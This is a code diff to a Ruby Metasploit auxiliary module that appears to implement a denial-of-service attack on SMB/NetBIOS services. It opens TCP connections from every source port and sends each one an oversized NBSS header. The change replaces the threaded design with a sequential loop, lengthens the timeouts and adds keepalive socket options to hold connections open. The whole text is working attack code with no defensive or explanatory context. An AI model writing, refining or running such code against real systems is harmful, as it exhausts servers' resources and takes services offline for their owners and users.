@@ -50,45 +50,29 @@ class MetasploitModule < Msf::Auxiliary
     header = NbssHeader.new
     header.message_length = 0x01FFFF
 
-    worker_threads = Queue.new
-
-    supervisor = Thread.new do
-      loop do
-        zombie_thread = worker_threads.pop(true)
-        unless zombie_thread.nil?
-          zombie_thread.kill
-        end
-      end
-    end
-
-    linger = Socket::Option.linger(true, 30)
+    linger = Socket::Option.linger(true, 60)
 
     (1..65535).each do |src_port|
       print_status "Sending packet from Source Port: #{src_port}"
-      mythr = Thread.new do
-        opts = {
-          'CPORT'           => src_port,
-          'ConnectTimeout'  => 30
-        }
+      opts = {
+        'CPORT'           => src_port,
+        'ConnectTimeout'  => 360
+      }
 
-        begin
-          #nsock = Socket.tcp(rhost, rport, '0.0.0.0' , src_port)
-          nsock = connect(false, opts)
-          nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
-          nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
-          nsock.setsockopt(linger)
-
-          nsock.write(header.to_binary_s)
-        rescue Exception => e
-          print_error "Exception sending packet: #{e.message}"
-        end
-
+      begin
+        nsock = connect(false, opts)
+        nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
+        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
+        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
+        nsock.setsockopt(linger)
+        nsock.write(header.to_binary_s)
+      rescue ::Exception => e
+        print_error "Exception sending packet: #{e.message}"
       end
-      worker_threads << mythr
     end
     print_status "Sleeping for 30 seconds..."
     select(nil, nil, nil, 30)
-    supervisor.kill
+
   end
 
 end
